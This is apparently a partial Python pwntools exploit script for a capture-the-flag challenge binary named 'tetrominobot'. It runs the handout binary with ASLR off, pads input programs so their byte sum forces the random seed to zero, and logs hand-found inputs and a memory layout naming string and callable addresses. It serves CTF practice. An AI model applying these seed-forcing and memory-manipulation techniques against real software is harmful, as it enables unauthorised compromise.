from pwn import *
from functools import reduce

context.aslr = False
# context.log_level = "debug"
context.log_level = "info"

p = None


def spawn_process():
    return process(["./out/handout/ld-linux-x86-64.so.2",
                    "--library-path",
                    "./out/handout",
                    "./out/handout/tetrominobot"])


SEED_SIZE = 2 ** 16;
GOAL_SRAND = 0

def prog_sum(prog):
    return reduce(lambda a, c: a + c, prog, 0) % SEED_SIZE

def rand_override(prog):
    # EOF char = 4
    todo = (GOAL_SRAND + SEED_SIZE - (prog_sum(prog) + 4)) % SEED_SIZE
    return prog + b'' \
        + b''.join([b'~' for i in range(todo // ord('~'))]) \
        + bytes([todo % ord('~')])

# def test_srand_override():
#     # ur gonna have to use your eyes for this one im sorry
#     test_progs = [
#         b"{call(drop)}",
#         b"{call(drop) }",
#         b"{call(drop)  }",
#         b"{call(drop)   }",
#         b"{call(drop)    }",
#         b"{call(drop)     }",
#         b"{call(drop)      }",
#         b"{call(drop)       }",
#         b"{call(drop)        }",
#         b"{call(drop)         }",
#         b"{mem[0] = 0; call(drop)}",
#         b"{mem[5] = call(drop);}",
#         b"{mem[1] = 1; call(drop)}",
#         b"{mem[10] = call(drop);}",
#         b"{if (1) {call(drop)}}",
#         b"{if (1) {call(drop);}}",
#         b"{if (1) {call(drop); call(drop)}}",
#         b"{if (1) {call(drop); call(drop);}}",
#     ]
#
#     for prog in test_progs:
#         testp = process(["./out/handout/ld-linux-x86-64.so.2",
#                          "--library-path",
#                          "./out/handout",
#                          "./out/handout/tetrominobot", "-d", "-n", "robot"])
#         testp.recvuntil(b'> ')
#         testp.sendline(rand_override(prog))
#         out = testp.recvall(timeout=0.5)
#         log.info(prog_sum(rand_override(prog)))
#         log.info(out)
#         testp.close()
#
# test_srand_override()

# played manually with srand 0 searching for addresses, logging inputs
cmdlog_ceiling = b"=== g  g--.ad-d---d-d=dda=d=d=dd=d.."
cmdlog_tspin = b"d----   g    gw===    -g====s.wd==.-.w--a   a.g"
# cmdlog_tspin = b"d----..w===                    -.====s.wd==.-.wa--                   a.g"

"""
mem[0] = string address
mem[1] = callable address

mem[2] = 0 (segfault barrier)

mem[4] = global counter
mem[5] = f return value

"""
